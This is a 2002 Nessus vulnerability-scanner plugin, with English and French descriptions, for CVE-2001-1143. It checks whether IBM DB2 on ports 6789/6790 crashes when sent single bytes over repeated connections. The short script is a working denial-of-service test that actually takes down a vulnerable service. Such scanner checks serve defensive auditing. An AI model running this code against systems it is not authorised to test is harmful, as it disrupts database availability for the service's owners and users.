#
# This script was written by Michel Arboi <arboi@alussinan.org>, starting 
# from miscflood.nasl
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10871);
 script_bugtraq_id(3010);
 script_version("$Revision: 1.8 $");
 script_cve_id("CVE-2001-1143");
 name["english"] = "DB2 DOS";
 name["francais"] = "Déni de service contre DB2";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash
the DB2 database by sending just one byte to it.

An attacker  may use this attack to make this
service crash continuously, preventing you
from working properly.


Solution: upgrade your software

Risk factor : High";


 desc["francais"] = "Il a été possible de
faire planter la base de données DB2 en 
envoyant juste un octet.

Un pirate peut exploiter cette faille 
pour faire planter continuellement ce
service, vous empêchant ainsi de travailler
correctement.


Solution: mettez à jour votre logiciel

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Flood against the remote service";
 summary["francais"] = "Surcharge du service distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";

 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(6789, 6790);
 exit(0);
}

#

function test_db2_port(port)
{
 if (! get_port_state(port))
  return(0);

 soc = open_sock_tcp(port);
 if (!soc)
  return(0);
 for (i=0; i<100; i=i+1)
 {
  send(socket:soc, data:string("x"));
  close(soc);

  soc = open_sock_tcp(port);
  if (! soc)
  {
   sleep(1);
   soc = open_sock_tcp(port);
   if (! soc)
   {
    security_hole(port);
    return (1);
   }
  }
 }
 close(soc);
 return(1);
}

test_db2_port(port:6789);
test_db2_port(port:6790);

